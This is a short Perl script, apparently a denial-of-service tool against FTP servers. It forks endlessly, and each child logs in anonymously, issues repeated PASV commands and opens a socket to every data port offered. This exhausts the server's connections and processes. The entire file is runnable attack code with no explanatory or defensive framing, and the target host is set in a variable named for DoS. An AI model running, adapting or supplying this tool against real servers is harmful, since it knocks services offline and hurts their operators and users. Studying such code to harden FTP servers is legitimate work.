#!/usr/bin/perl

$DOS_HOST="localhost";

use IO::Socket;

$pid = $$;
$num = 0;

while (1) {
    while (fork) {
        $sock = IO::Socket::INET->new(
            Proto    => "tcp",
            PeerAddr => $DOS_HOST,
            PeerPort => "ftp(21)",
        );

        if (!$sock) {
            print "connect failed!\n";
            waitpid -1,0;
        }


        while (<$sock>) {
            print;
            print $sock "USER anonymous\r\n" if (/^220 .*/);
            print $sock "PASS root@\r\n" if (/^331 .*/);
            print $sock "PASV\r\n" if (/^230 .*/);

            if (/^227 .*/) {
                $remote = $_;
                $remote =~ s/^.* [^\d,]*(\d[\d,]+)[^\d,]*$/$1/;
                @bits = split(/,/, $remote);
                if ($#bits eq 5) {
                    $remport = $bits[4] * 256 + $bits[5];
                    $#bits = 3;
                    $remip = join('.', @bits);
                    $foo[$num++] = IO::Socket::INET->new(
                            Proto => "tcp",
                            PeerAddr => $remip,
                            PeerPort => "($remport)");
                }
                print $sock "PASV\r\n";
            }
            last if (/^530 .*/);
        }
        waitpid -1,0;
    }
    sleep(5);
}

